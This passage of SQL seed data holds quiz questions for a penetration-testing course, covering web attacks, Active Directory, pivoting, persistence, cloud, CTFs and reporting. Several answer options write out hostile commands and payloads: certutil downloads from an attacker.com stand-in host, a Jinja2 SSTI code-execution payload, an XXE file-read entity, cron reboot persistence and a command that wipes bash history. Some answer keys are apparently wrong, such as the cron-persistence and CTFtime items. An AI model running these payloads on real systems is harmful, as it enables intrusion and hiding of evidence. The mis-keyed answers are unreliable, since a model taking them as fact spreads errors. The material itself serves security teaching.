  '["Enumerates all users in Active Directory","Requests service tickets for SPN accounts for offline Kerberoasting","Dumps all NTLM hashes from the domain","Performs pass-the-hash authentication"]', 1),

(58, 'What is spear phishing?',
  '["Mass phishing emails sent to millions of random targets","Highly targeted phishing attacks customized with victim-specific information","Physical social engineering in person","Phishing via SMS text messages"]', 1),
(58, 'Which tool is used by penetration testers to send realistic phishing campaigns and track clicks and submissions?',
  '["SET (Social Engineering Toolkit)","GoPhish","King Phisher","Lucy"]', 1),
(58, 'What OSINT source is most valuable for crafting a convincing spear-phishing pretext about IT systems?',
  '["Victim''s social media posts","Company job postings listing specific technologies (AWS, Kubernetes, Splunk)","WHOIS registration data","Shodan IP scan results"]', 1),

(59, 'Which technique bypasses antivirus by executing shellcode entirely in memory without writing a file to disk?',
  '["Encoding with base64","In-memory (fileless) execution via process injection or PowerShell download cradle","Packing the executable with UPX","Renaming the malware to svchost.exe"]', 1),
(59, 'What is AMSI and why do attackers try to bypass it?',
  '["Anti-Malware Scan Interface — scans PowerShell and .NET scripts in memory before execution, detecting malicious code","Application Memory Security Interface — manages process memory permissions","Advanced Malware Scanning Infrastructure — network-based detection","Anti-Metadata Security Interface — blocks credential theft"]', 0),
(59, 'What does the certutil tool (LOLBAS) allow an attacker to do on Windows without triggering some AV solutions?',
  '["Run PowerShell scripts","Download files from the internet using certutil -urlcache -split -f http://attacker.com/shell.exe","Create scheduled tasks","Add firewall exceptions"]', 1),

(60, 'The TryHackMe ''Mr Robot'' room requires exploiting which content management system (CMS)?',
  '["Drupal","Joomla","WordPress","Magento"]', 2),
(60, 'What is the primary purpose of the rockyou.txt wordlist in password attacks?',
  '["A custom wordlist generated from a target website","A list of MD5 hashes of common passwords","A real-world password list from the 2009 RockYou breach containing 14M+ passwords","A list of default router passwords"]', 2),
(60, 'After exploiting a web vulnerability, what is the first command to run to identify the current user context on Linux?',
  '["whoami OR id","uname -a","cat /etc/passwd","ps aux"]', 0),

-- ================================================================
-- DAYS 61-120 QUIZZES (Phases 4-6)
-- ================================================================
(61,'Which OWASP Top 10 2021 category ranks #1 as the most critical web security risk?','["A01: Broken Access Control","A03: Injection","A07: Identification & Auth Failures","A05: Security Misconfiguration"]',0),
(61,'NoSQL injection in MongoDB can be triggered by sending which payload in a JSON body?','["'' OR 1=1-- -","{\"$gt\": \"\"}","<script>alert(1)</script>","../../etc/passwd"]',1),
(61,'Which LDAP injection payload bypasses authentication in a vulnerable LDAP query?','["'' OR 1=1","*)(&","../etc/passwd","<SCRIPT>"]',1),

(62,'What is an IDOR (Insecure Direct Object Reference)?','["A reflected XSS vulnerability in IDs","Accessing another user''s resources by changing an object identifier without authorization","An SQL injection in ID fields","A CSRF token bypass"]',1),
(62,'Horizontal privilege escalation means accessing resources of:','["An admin account from a regular user account","Another user at the same privilege level","A higher-privilege service account","A system-level process"]',1),
(62,'Which HTTP method change can sometimes bypass access controls on endpoints that restrict GET but not POST?','["Changing GET to OPTIONS","Changing GET to DELETE","Changing GET to POST or PUT","Changing GET to HEAD"]',2),

(63,'What is the AWS EC2 metadata endpoint URL targeted in SSRF attacks?','["http://aws.internal/metadata","http://169.254.169.254/latest/meta-data/","http://metadata.google.internal/computeMetadata/v1/","http://10.0.0.1/aws/iam/"]',1),
(63,'Which filter bypass converts 127.0.0.1 to decimal to evade SSRF protections?','["hex encoding: 0x7f000001","URL encoding: %31%32%37","Decimal: 2130706433","Octal: 0177.0.0.1"]',2),
(63,'What is the impact of a successful SSRF attack on a cloud-hosted application?','["Only causes information disclosure about external IPs","Can lead to IAM credential theft, internal network access, and potential RCE via IMDS","Only allows file reading on the server","Enables XSS on the application"]',1),

(64,'Which XML payload declares a malicious external entity to read /etc/passwd?','["<entity>file:///etc/passwd</entity>","<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>","<?xml entity=/etc/passwd?>","<include file=\"/etc/passwd\"/>"]',1),
(64,'What is blind XXE and how is it detected?','["XXE that causes server errors","XXE where the file content is not reflected — detected via out-of-band DNS/HTTP callbacks to Burp Collaborator","XXE that only works on Windows","XXE that requires authentication"]',1),
(64,'Which file format, when processed by a vulnerable parser, commonly leads to XXE vulnerabilities beyond web apps?','["JSON","CSV","XML-based formats like SVG, XLSX, DOCX, and RSS feeds","YAML"]',2),

(65,'Which Jinja2 SSTI payload achieves Remote Code Execution by accessing the os module?','["{{7*7}}","{{config.items()}}","{{config.__class__.__init__.__globals__[''os''].popen(''id'').read()}}","{{self._TemplateReference__context.cycler.__init__.__globals__}}"]',2),
(65,'How do you identify the template engine used in an SSTI vulnerability?','["Send SQL injection payloads","Inject {{7*7}} vs ${7*7} vs #{7*7} and observe which evaluates to 49","Check the X-Powered-By header","Look for .tpl file extensions"]',1),
(65,'What CVSS severity is typically assigned to SSTI vulnerabilities that allow RCE?','["Low (3.0)","Medium (5.0)","High (7.5)","Critical (9.8+)"]',3),

(66,'JWT algorithm confusion attack changes the algorithm from RS256 to HS256 to exploit what?','["The token expiry time","Using the RSA public key as the HMAC secret since the public key is often obtainable","The JWT header format","Token signature length differences"]',1),
(66,'Which hashcat mode cracks HS256 JWT tokens?','["0 (MD5)","3200 (bcrypt)","16500 (JWT HS256)","5600 (NetNTLMv2)"]',2),
(66,'What OAuth vulnerability allows stealing authorization codes by manipulating the redirect_uri parameter?','["PKCE downgrade","Open redirect in redirect_uri to attacker-controlled domain","CSRF on the authorization endpoint","Token leakage via referrer header"]',1),

(67,'In Burp Suite Intruder, which attack type uses a single payload list replacing one insertion point at a time?','["Battering Ram","Pitchfork","Cluster Bomb","Sniper"]',3),
(67,'What is the purpose of Burp Suite''s Collaborator feature?','["Generate payloads","Detect out-of-band interactions (DNS/HTTP) for blind vulnerabilities like blind XXE and SSRF","Perform automated active scanning","Manage project history"]',1),
(67,'Which Burp Suite extension automatically tests for broken access control by comparing responses as different users?','["Param Miner","Active Scan++","Autorize","JWT Editor"]',2),

(68,'What is BOLA in API security?','["Buffer Overflow Logic Attack","Broken Object Level Authorization — same as IDOR but in API context","Blind Output Logic Attack","Base64 Obfuscation Layer Attack"]',1),
(68,'Mass assignment in APIs occurs when:','["The API processes more HTTP methods than expected","The API accepts and applies extra fields sent by the client (e.g., isAdmin: true) that should not be user-controlled","The API returns all database columns instead of selected fields","The API allows batch requests without rate limiting"]',1),
(68,'What GraphQL query reveals the entire API schema including all types, queries, and mutations?','["{schema{types{name}}}","{__schema{types{name,fields{name}}}}","query{allTypes}","{introspect{schema}}"]',1),

(69,'Which cipher mode encrypts identical plaintext blocks to identical ciphertext blocks, revealing patterns?','["CBC (Cipher Block Chaining)","GCM (Galois/Counter Mode)","ECB (Electronic Codebook)","CTR (Counter Mode)"]',2),
(69,'What does a padding oracle attack allow?','["Bypassing hash verification","Decrypting and forging CBC-mode ciphertext by exploiting padding error responses","Breaking RSA encryption","Cracking bcrypt password hashes"]',1),
(69,'testssl.sh is used to:','["Perform SQL injection on SSL endpoints","Enumerate SSL/TLS protocol versions, cipher suites, and certificate vulnerabilities","Generate self-signed SSL certificates","Crack SSL private keys"]',1),

(70,'What Java serialization magic bytes indicate a serialized Java object?','["FF FE","AC ED","CA FE BA BE","DE AD BE EF"]',1),
(70,'Which tool generates gadget chains for Java deserialization attacks?','["ysoserial","pwntools","impacket","ROPgadget"]',0),
(70,'PHP deserialization attacks exploit which PHP magic method to achieve code execution?','["__construct","__toString","__destruct or __wakeup","__sleep"]',2),

(71,'What is a race condition vulnerability in a web application?','["XSS triggered by rapid user input","A bug where the application outcome depends on the timing of concurrent requests, allowing actions like double-spending","A buffer overflow in concurrent connections","SQL injection via parallel requests"]',1),
(71,'What business logic vulnerability allows buying a product for a negative price?','["IDOR on the shopping cart","Insufficient input validation allowing negative quantity or price values","CSRF on the checkout form","SQL injection in the order total"]',1),
(71,'Which Burp Suite feature is best suited for sending many parallel requests to exploit race conditions?','["Intruder (Sniper mode)","Turbo Intruder","Repeater","Scanner"]',1),

(72,'Web cache poisoning exploits which type of input to inject malicious content into a cache?','["SQL injection payloads","Unkeyed inputs that the cache ignores but the application uses to generate the response","XSS payloads in cached pages","Command injection via cached headers"]',1),
(72,'Which tool helps discover unkeyed HTTP parameters in Burp Suite for cache poisoning research?','["Active Scan++","JWT Editor","Param Miner","Autorize"]',2),
(72,'Cache deception attacks aim to:','["Poison other users'' cached content","Trick the cache into storing the victim''s sensitive response at an attacker-accessible URL","Bypass authentication via cached tokens","Perform XSS through cached JavaScript"]',1),

(73,'What discrepancy does an HTTP Request Smuggling attack exploit?','["Difference in HTTP methods between client and server","Difference in how frontend proxy and backend server parse Content-Length vs Transfer-Encoding headers","Different SSL versions between client and load balancer","Different session ID formats between services"]',1),
(73,'In a CL.TE desync attack, which server uses Content-Length?','["The backend","The frontend","Both use Content-Length","Neither — only Transfer-Encoding is used"]',0),
(73,'What is the primary impact of a successful HTTP Request Smuggling attack?','["Remote code execution on the server","Bypassing access controls, stealing headers/cookies from other users'' requests","SQL injection in HTTP headers","XSS via smuggled response"]',1),

(74,'In GraphQL, what does disabling introspection prevent?','["All GraphQL queries","Attackers from automatically discovering the full API schema and available mutations","SQL injection via GraphQL","Authentication bypass"]',1),
(74,'What is a GraphQL batching attack?','["SQL injection via GraphQL mutations","Sending multiple queries in a single request to bypass rate limiting (e.g., brute-forcing OTPs)","Exploiting GraphQL subscriptions","XXE via GraphQL file upload"]',1),
(74,'Which tool generates a visual map of a GraphQL schema for easier attack surface analysis?','["Burp Suite Scanner","GraphQL Voyager","InQL","Clairvoyance"]',1),

(75,'What file in an Android APK contains the app''s network security configuration?','["AndroidManifest.xml","network_security_config.xml","res/xml/network_security_config.xml","app/src/main/network.xml"]',2),
(75,'Frida is used in mobile security testing to:','["Decompile APK files","Hook and modify functions at runtime, enabling SSL pinning bypass and root detection bypass","Crack APK encryption","Intercept SMS messages"]',1),
(75,'Which tool decompiles an Android APK back into readable Java/Kotlin source code?','["apktool","jadx","dex2jar + JD-GUI","adb"]',1),

(76,'What is DOM clobbering in the context of XSS?','["Overwriting DOM elements with JavaScript","Using named HTML elements to shadow JavaScript variables and introduce XSS","Injecting malicious DOM nodes via CSS","Manipulating document.write() calls"]',1),
(76,'Which CSP bypass uses a trusted CDN-hosted JavaScript endpoint that accepts attacker-controlled callbacks?','["script-src none bypass","JSONP endpoint on whitelisted CDN domain","data: URI injection","nonce-based bypass"]',1),
(76,'What is prototype pollution and how can it lead to XSS?','["Corrupting browser history","Adding properties to Object.prototype so all objects inherit attacker-controlled values, potentially reaching innerHTML sinks","Polluting HTTP headers","Modifying prototype chain to bypass authentication"]',1),

(77,'Second-order SQL injection occurs when:','["SQL injection affects two databases simultaneously","Malicious input is stored safely but later used unsanitized in a different SQL query","SQL injection requires two requests to succeed","Both GET and POST parameters are vulnerable"]',1),
(77,'Why is second-order XSS harder to detect than reflected XSS?','["It requires JavaScript disabled","The payload is stored in one location and triggered in a completely different context, making source-to-sink tracing difficult","It only affects admin users","It uses encoding that bypasses all WAF rules"]',1),
(77,'What tool traces data flow from input to output (source to sink) to find injection vulnerabilities?','["Source code review combined with taint analysis tools like Semgrep","Nmap NSE scripting","Wireshark packet analysis","Shodan dorking"]',0),

(78,'What is a realistic impact of Stored XSS on an admin panel?','["Denial of Service against admin users","When admin views the page, attacker steals admin session cookie → full account takeover → admin actions on behalf of attacker","Only cosmetic page defacement","Sending phishing emails from the server"]',1),
(78,'Which OWASP category covers Stored XSS?','["A01: Broken Access Control","A03: Injection","A07: Identification and Authentication Failures","A10: Server-Side Request Forgery"]',1),
(78,'What does the HTTP response header ''X-Content-Type-Options: nosniff'' prevent?','["Clickjacking via iframes","MIME type sniffing, preventing browsers from executing files as script even if served with wrong content type","XSS via reflected parameters","CSRF token bypass"]',1),

(79,'What is included in the Executive Summary of a penetration test report?','["Detailed technical steps for every finding","A business-focused overview of risk, key findings, and strategic recommendations without deep technical jargon","Raw Nmap scan output","Complete list of all tested IP addresses and ports"]',1),
(79,'What does CVSS measure?','["The financial cost of a vulnerability","The technical severity of a vulnerability on a 0.0-10.0 scale based on exploitability and impact","The time required to exploit a vulnerability","The probability a vulnerability will be exploited in the wild"]',1),
(79,'Which pentest methodology document is considered the industry standard for structured penetration testing?','["OWASP ASVS","CEH Exam Blueprint","PTES (Penetration Testing Execution Standard)","NIST SP 800-115"]',2),

(80,'Which PortSwigger Web Security Academy lab category is most important for understanding OWASP A01?','["SQL injection","Access control vulnerabilities","XSS","Clickjacking"]',1),
(80,'What does the PortSwigger Burp Suite Collaborator detect?','["Synchronous vulnerabilities in responses","Out-of-band interactions for blind vulnerabilities like blind SSRF, blind XXE, and blind command injection","Stored XSS payloads","CORS misconfigurations"]',1),
(80,'Which web security tool performs automated active scanning and can be used from Burp Suite''s Dashboard?','["OWASP ZAP only","Burp Scanner (built into Burp Suite Pro)","Nikto","DirBuster"]',1),

-- Phase 5 quizzes (Days 81-100)
(81,'What authentication protocol does Active Directory primarily use for internal authentication?','["NTLM","LDAP","Kerberos","RADIUS"]',2),
(81,'Which AD group membership gives complete control over an Active Directory domain?','["Server Operators","Backup Operators","Schema Admins","Domain Admins"]',3),
(81,'What Active Directory object contains network-wide configuration policies applied to computers and users?','["Organizational Unit (OU)","Group Policy Object (GPO)","Domain Controller","Active Directory Forest"]',1),

(82,'What is the purpose of BloodHound in Active Directory pentesting?','["Crack Kerberos service tickets","Visualize attack paths to high-privilege accounts using graph theory","Perform Pass-the-Hash attacks","Enumerate SMB shares"]',1),
(82,'Which BloodHound edge means an account has full control over another AD object, including the ability to reset its password?','["MemberOf","HasSession","GenericAll","CanRDP"]',2),
(82,'Which Python tool collects Active Directory data for BloodHound from a Linux attack machine?','["ldapdomaindump","bloodhound-python","impacket-bloodhound","crackmapexec --bloodhound"]',1),

(83,'Kerberoasting extracts which type of tickets from Active Directory for offline cracking?','["TGT (Ticket Granting Tickets) for all users","TGS (Service Tickets) for accounts with Service Principal Names (SPNs)","NTLM hashes from LSASS","AS-REP tokens for any user"]',1),
(83,'What is AS-REP Roasting and which account configuration makes it possible?','["Requesting service tickets — requires any valid credential","Requesting AS-REP for accounts with Kerberos pre-authentication disabled — no credentials needed","Forging PAC data in Kerberos tickets","Stealing TGTs from memory using Mimikatz"]',1),
(83,'Which hashcat mode number cracks Kerberoasted service ticket hashes?','["5600 (NetNTLMv2)","1000 (NTLM)","13100 (Kerberos TGS)","18200 (Kerberos AS-REP)"]',2),

(84,'Pass-the-Hash (PtH) attacks use which type of credential to authenticate without knowing the plaintext password?','["Kerberos TGT","NTLM password hash","Cleartext password from memory","Kerberos service ticket"]',1),
(84,'Which Impacket tool authenticates to a Windows host via WMI, avoiding creating a service like PSExec?','["smbexec.py","psexec.py","wmiexec.py","atexec.py"]',2),
(84,'Evil-WinRM connects to which Windows remote management protocol by default?','["RDP (port 3389)","SMB (port 445)","WinRM (port 5985/5986)","Telnet (port 23)"]',2),

(85,'Which Mimikatz command dumps cleartext passwords and NTLM hashes from LSASS memory?','["lsadump::sam","sekurlsa::logonpasswords","lsadump::dcsync","privilege::debug"]',1),
(85,'What is the purpose of DCSync and which permissions are required?','["Dump SAM database — requires local admin","Impersonate a Domain Controller to replicate all password hashes — requires DS-Replication rights","Perform Kerberoasting — requires SPN enumeration access","Dump LSASS — requires SeDebugPrivilege"]',1),
(85,'Which tool performs remote LSASS dumping without touching disk on the target system?','["procdump.exe","Task Manager","LSASSY","Volatility"]',2),

(86,'A Golden Ticket attack uses which credential to forge Kerberos TGTs?','["Domain Administrator''s NTLM hash","krbtgt account NTLM hash","The LSASS memory dump","The DC computer account hash"]',1),
(86,'Why does a Golden Ticket persist even after the Domain Admin password is changed?','["Golden Tickets are stored in the registry","They are valid as long as the krbtgt hash is the same — must reset krbtgt twice to invalidate all tickets","Golden Tickets are cached in hardware TPM","Domain password changes don''t affect Kerberos"]',1),
(86,'What is a Silver Ticket attack?','["Forging a TGT using the krbtgt hash","Forging a TGS service ticket using a specific service account''s hash to access that service without contacting the DC","Stealing silver certificates from PKI","Impersonating a Domain Controller"]',1),

(87,'Which chisel command on the attacker machine sets up a reverse SOCKS proxy server?','["chisel server --socks5 --port 8080","chisel server --reverse --port 8080","chisel client attacker:8080 socks","chisel proxy --listen 8080"]',1),
(87,'What configuration file must be edited on Linux to route tool traffic through a SOCKS proxy created by chisel?','["/etc/hosts","/etc/proxychains.conf or /etc/proxychains4.conf","/etc/iptables.conf","/etc/resolv.conf"]',1),
(87,'SSH dynamic port forwarding (-D) creates what type of proxy?','["HTTP proxy on specified port","SOCKS5 proxy on specified port for routing arbitrary TCP traffic through the SSH tunnel","Direct port forward to specific destination","Transparent proxy at network layer"]',1),

(88,'Which Linux persistence mechanism adds a command to execute on every system reboot via cron?','["Modifying /etc/rc.local only","Adding @reboot /path/to/shell to /etc/crontab or user crontab","Creating a systemd user service","Adding to .bashrc"]',2),
(88,'What Windows registry key location stores programs that automatically run when any user logs in?','["HKLM\\System\\Services","HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","HKCU\\Software\\Startup","HKLM\\System\\Boot\\Programs"]',1),
(88,'Why is creating a new user account for persistence on a compromised system considered high-risk operationally?','["New user accounts reset all system passwords","It generates obvious log entries and may trigger security alerts from monitoring tools","New accounts don''t have network access","Administrators can''t see new local accounts"]',1),

(89,'What is the attack chain for exploiting GenericAll rights over a user object in BloodHound?','["Dump the user''s password hash directly","Force a password change on the user and authenticate with the new password","Inject a malicious GPO","Perform DCSync using that user''s context"]',1),
(89,'Resource-Based Constrained Delegation (RBCD) abuse requires which two AD permissions?','["GenericAll on the target computer + domain admin rights","GenericWrite on the target computer + the ability to create/control a computer object","WriteDACL + ReadDACL on the target","Domain Replication rights + SeBackupPrivilege"]',1),
(89,'Why is the Active Directory path ''Domain Users → Nested Group → Server Operators → DC'' dangerous?','["Domain Users can directly access the DC","Group nesting can grant unexpected high privileges — Server Operators can log into DCs and manage services","Server Operators is a low-privilege group by default","Nested groups are not evaluated by Active Directory"]',1),

(90,'What is the difference between LSASS dumping and DCSync?','["Both require physical access to the DC","LSASS dumps require running a process on the DC; DCSync replicates from the DC remotely using replication rights — no process needed on DC","DCSync only extracts current user hash; LSASS gets all users","LSASS is noisier than DCSync — DCSync creates logs on every DC"]',1),
(90,'Which Volatility command lists all processes from a Windows memory dump?','["volatility pslist","volatility -f dump.mem --profile=Win10x64 pslist","vol.py --list-processes dump.mem","volatility proc-enum dump.mem"]',1),
(90,'Azure AD Connect, if compromised, allows what attack?','["Only local Active Directory domain compromise","Compromise of both on-premises AD and Azure AD by abusing the sync account''s replication privileges","Only Azure AD compromise","Read access to all cloud resources"]',1),

(91,'Which CVE is ''Dirty COW'' and what type of vulnerability is it?','["CVE-2016-5195 — race condition in Linux kernel copy-on-write memory handling, allowing write to read-only files","CVE-2017-0144 — SMB remote code execution","CVE-2014-6271 — Bash environment variable parsing","CVE-2021-44228 — Log4j JNDI injection"]',0),
(91,'What is the main risk of using kernel exploits during a penetration test?','["They require root to compile","They are always detected by antivirus","They can crash the system or cause kernel panic — potentially causing service outage","Kernel exploits don''t work on patched systems"]',2),
(91,'Before trying kernel exploits, what is the recommended approach for Linux privilege escalation?','["Try kernel exploits first as they are most reliable","Exhaust all other methods (SUID, sudo, cron, capabilities, writable paths) since kernel exploits are risky","Only use kernel exploits with explicit permission in the rules of engagement","Never use kernel exploits — they are always illegal"]',2),

(92,'What is the AWS IMDS v2 protection and how does it mitigate SSRF attacks?','["It encrypts IAM credentials in transit","It requires a PUT request with TTL header to get a session token before querying metadata, preventing simple SSRF that only does GET requests","It blocks all requests from non-EC2 sources","It limits metadata access to VPC endpoints only"]',1),
(92,'Pacu is a penetration testing framework designed for:','["Physical security assessments","AWS cloud environment exploitation and privilege escalation","Azure Active Directory attacks","Container security testing"]',1),
(92,'Which AWS action, if granted, allows an attacker to create a new IAM user with admin permissions?','["ec2:DescribeInstances","s3:GetObject","iam:CreateUser + iam:AttachUserPolicy","cloudtrail:StartLogging"]',2),

(93,'What does mounting the Docker socket (/var/run/docker.sock) inside a container allow?','["Increased container network speed","Full control over the Docker daemon — allowing creation of privileged containers that can mount and access the host filesystem","Read-only access to host Docker images","Communication between containers only"]',1),
(93,'Which tool audits Kubernetes RBAC configurations and cluster for common misconfigurations?','["Trivy","Falco","kube-hunter","kube-bench"]',2),
(93,'A container escape via --privileged flag typically involves what technique?','["Reading host memory directly","Mounting the host filesystem via /proc/sysrq-trigger or cgroups release_agent","Exploiting the container runtime","Hijacking host network interfaces"]',1),

(94,'What is the Living Off the Land (LOLBAS) technique?','["Using open-source attack tools to avoid licensing costs","Using legitimate OS binaries already present on Windows to perform attacker objectives without bringing external tools","Only attacking targets during business hours to blend in","Using victim''s own cloud resources for C2"]',1),
(94,'Which LOLBAS technique uses certutil to download a remote file?','["certutil /download http://attacker.com/file.exe","certutil -urlcache -split -f http://attacker.com/file.exe file.exe","certutil -decode http://attacker.com/file.exe file.exe","certutil -install http://attacker.com/file.exe"]',1),
(94,'What command clears bash history to reduce forensic evidence on Linux?','["rm ~/.bash_history && history -c","history -c && echo > ~/.bash_history && unset HISTFILE","clear history","echo '' '' > /var/log/bash.log"]',1),

(95,'Responder captures credentials by poisoning which network protocols?','["ARP and DNS","LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service)","DHCP and DNS","SMB and HTTP"]',1),
(95,'What does ntlmrelayx.py do with captured NTLM credentials?','["Cracks them offline","Relays them to another host for authentication without cracking, enabling access to that host","Stores them in a database","Converts them to Kerberos tickets"]',1),
(95,'SMB relay attacks are possible when the target has what configuration?','["SMB Signing enabled","SMB Signing disabled — allowing credential relay without HMAC verification","Anonymous SMB access enabled","SMBv1 enabled"]',1),

(96,'What Python library is the standard for binary exploitation development in CTFs and research?','["impacket","scapy","pwntools","pyshark"]',2),
(96,'Return-Oriented Programming (ROP) bypasses which memory protection?','["ASLR (Address Space Layout Randomization)","NX/DEP (No-Execute / Data Execution Prevention) by chaining existing executable code gadgets","Stack Canaries by overwriting the cookie","PIE by using fixed addresses"]',1),
(96,'What does ''checksec'' tell you about a binary before exploitation?','["The binary''s source code","Which exploit mitigations are enabled (NX, ASLR, PIE, Canary, RELRO)","The binary''s network connections","Hardcoded passwords in the binary"]',1),

(97,'What Metasploit post-exploitation module suggests local privilege escalation exploits for the current session?','["post/multi/gather/credentials","post/multi/recon/local_exploit_suggester","post/linux/gather/enum_system","exploit/local/auto_privesc"]',1),
(97,'PowerShell Empire is primarily used for what phase of an engagement?','["Initial exploitation","Post-exploitation command and control on Windows targets","Network scanning","Password cracking"]',1),
(97,'Why is documenting timestamps and exact commands during an engagement important?','["To improve hacking speed on future engagements","Legal protection (proof of authorized actions) and accurate technical reporting with evidence","To train machine learning models","Timestamps are required by Metasploit to save sessions"]',1),

(98,'What is a BadUSB attack?','["Attacking USB storage devices to encrypt them","A malicious USB device that impersonates a keyboard (HID) to inject commands when plugged in","Exploiting USB driver vulnerabilities in the kernel","Exfiltrating data via USB power channel"]',1),
(98,'RFID cloning attacks against physical access cards require what hardware tool?','["Flipper Zero or Proxmark3 — NFC/RFID read/write devices","Rubber Ducky — USB keystroke injection","LAN Turtle — network implant","Wi-Fi Pineapple — wireless attack device"]',0),
(98,'What is an ''evil maid'' attack?','["A social engineering attack via cleaning staff","Physical access to an unattended device to install hardware keyloggers, extract encryption keys, or plant malware","Remote attack via smart home devices","Insider threat via compromised IT contractor"]',1),

(99,'MITRE ATT&CK framework organizes adversary behavior into:','["CVE severity levels","Tactics (why), Techniques (how), and Sub-techniques (specific implementation details)","Security control frameworks","Penetration testing phases"]',1),
(99,'What is domain fronting in red team C2 operations?','["Registering typosquat domains","Using legitimate CDN services to route C2 traffic, hiding the true C2 server behind a trusted domain name","Creating fake login pages on owned domains","Compromising a target domain to use as C2"]',1),
(99,'What document authorizes a red team to perform their simulated attack and protects them legally?','["Non-Disclosure Agreement","Statement of Work (SoW) with explicit scope and Rules of Engagement","Penetration Test Report","Bug Bounty Terms of Service"]',1),

(100,'TryHackMe''s ''Wreath'' network requires compromising how many machines using pivoting?','["1","2","3","4+"]',2),
(100,'What learning resource is considered the most comprehensive for OSCP preparation using HackTheBox machines?','["Google hacking database","TJNull''s OSCP HackTheBox machine list","OWASP Top 10 guide","CompTIA Security+ study materials"]',1),
(100,'Which active directory attack is performed after getting the krbtgt hash and provides indefinite domain persistence?','["Silver Ticket attack","Pass-the-Ticket","Golden Ticket attack","Skeleton Key attack"]',2),

-- Phase 6 quizzes (Days 101-120)
(101,'Which section of a penetration test report is written for non-technical stakeholders and contains the overall risk rating and strategic recommendations?','["Technical Findings","Scope and Methodology","Executive Summary","Appendices"]',2),
(101,'What CVSS 3.1 base score range is classified as Critical severity?','["7.0 – 8.9","6.0 – 7.9","9.0 – 10.0","8.5 – 10.0"]',2),
(101,'Which TCM Security resource provides a free sample professional penetration test report template?','["TCM Security Patreon","github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report","TCM Security YouTube","PentesterLab"]',1),

(102,'What does the CVSS Attack Vector metric of ''Network'' mean?','["Attack must be performed locally","Vulnerability can be exploited remotely over the network","Attack requires adjacent network access","Attack requires physical access"]',1),
(102,'What temporal CVSS metric adjusts the score based on whether a working exploit exists in the wild?','["Confidentiality Impact","Exploit Code Maturity","Report Confidence","Remediation Level"]',1),
(102,'A vulnerability requiring no privileges and no user interaction that affects all confidentiality, integrity, and availability would have approximately what CVSS base score?','["5.0 — Medium","7.5 — High","9.8 — Critical","3.0 — Low"]',2),

(103,'Which bug bounty program platform is known for paying the highest rewards for critical vulnerabilities?','["Bugcrowd","HackerOne (particularly enterprise programs like Google, Apple, Microsoft)","OpenBugBounty","Synack Red Team"]',1),
(103,'What makes a bug bounty submission ''out-of-scope''?','["Finding a vulnerability that is too complex","Testing a domain, IP, or feature explicitly excluded in the program''s scope definition","Submitting a medium severity finding","Finding a vulnerability already reported by another researcher"]',1),
(103,'Which bug bounty finding type is most commonly categorized as P1/Critical and pays highest rewards?','["Information disclosure of server version","Reflected XSS without impact","Remote Code Execution or Authentication Bypass leading to full account takeover","Open redirect"]',2),

(104,'What is the most important element of a bug bounty report that allows the triage team to reproduce the finding?','["Catchy report title","Clear step-by-step reproduction instructions with exact URLs, parameters, and payloads","Your estimated severity rating","Screenshots of the vulnerable login page"]',1),
(104,'What is the appropriate action when you discover a critical vulnerability while bug hunting that could affect real user data?','["Exploit it fully to demonstrate maximum impact","Immediately report to the program and stop further testing of that vulnerability","Post to Twitter to get credit","Wait until you have multiple findings to report together"]',1),
(104,'Which tool creates animated GIF screen recordings that are ideal for demonstrating XSS vulnerabilities in bug reports?','["OBS Studio","ScreenToGif or similar GIF recorder","Windows Snipping Tool","Burp Suite Logger"]',1),

(105,'In a CTF, when you find a binary labeled ''pwn'' or ''rev'', what tool would you first use to check its security mitigations?','["strings","file + checksec","nm","ltrace"]',1),
(105,'What CTF category involves analyzing network traffic captured in .pcap files?','["Binary Exploitation (pwn)","Forensics — using Wireshark or tcpdump","Reverse Engineering","Cryptography"]',1),
(105,'What is the standard flag format used by most CTF competitions?','["flag{...}","CTF{...}","The competition name + _{...} e.g. picoCTF{...}","hash{...}"]',2),

(106,'In a CTF web challenge, what should you check immediately in the page source?','["Server headers","HTML comments that may contain hints, hidden form fields, and linked JavaScript files","Meta refresh tags","CSS stylesheet links"]',1),
(106,'Which Python library is commonly used to automate HTTP requests in web CTF challenges?','["pycurl","urllib","requests","httplib"]',2),
(106,'A web CTF challenge shows ''Error: You have an error in your SQL syntax'' — what vulnerability is indicated?','["LFI (Local File Inclusion)","SQL Injection (error-based)","XSS (reflected)","Command Injection"]',1),

(107,'What website provides an automated multi-tool decoder for classical and modern ciphers?','["hashcat.net","CyberChef (gchq.github.io/CyberChef)","dcode.fr","crackstation.net"]',1),
(107,'In RSA, if the public exponent e=3 and the plaintext message is very small, what attack is possible?','["Fermat factoring","Cube root attack (since m^3 < n, take cube root of ciphertext)","Common modulus attack","Wiener''s attack"]',1),
(107,'What is frequency analysis used for in cryptography CTF challenges?','["Analyzing hash output patterns","Breaking monoalphabetic substitution ciphers by analyzing letter frequency","Detecting timing side-channels","Cracking RSA using prime frequency"]',1),

(108,'Which steganography tool extracts hidden data from images using a passphrase?','["strings","steghide","xxd","file"]',1),
(108,'What does binwalk do when analyzing a file in forensics challenges?','["Performs binary exploitation","Identifies and extracts embedded files and filesystem images within a binary file","Compares binary files for differences","Disassembles binary to assembly code"]',1),
(108,'In Volatility memory forensics, which command extracts file handles from a running process?','["volatility pslist","volatility dumpfiles","volatility filescan","volatility fileview"]',1),

(109,'What is a ret2libc attack?','["Returning to the main() function","Redirecting execution to the libc system() function with ''/bin/sh'' argument to get a shell when the stack is non-executable (NX)","Returning to libc address 0x0000 for a null pointer dereference","Corrupting libc heap metadata"]',1),
(109,'Which pwntools function creates a connection to a remote CTF challenge server?','["process(''./binary'')","remote(''challenge.ctf.com'', 1337)","connect(''host'', port)","socket(''host'', port)"]',1),
(109,'ROPgadget and ropper are used to find what in a binary for exploitation?','["Buffer overflow offsets","Small sequences of instructions ending in RET (gadgets) for building ROP chains","Format string vulnerabilities","Heap spray targets"]',1),

(110,'What is CTFtime.org primarily used for?','["Hosting CTF challenges year-round","Finding and registering for upcoming CTF competitions and tracking team scores","Bug bounty program directory","Vulnerability database for CTF writeups"]',0),
(110,'What is the recommended team size and structure for CTF competitions?','["Solo — all tools are individual","2-3 people with identical skills","4-8 people with diverse specializations (web, crypto, pwn, forensics, reverse engineering)","10+ people to cover all categories simultaneously"]',2),
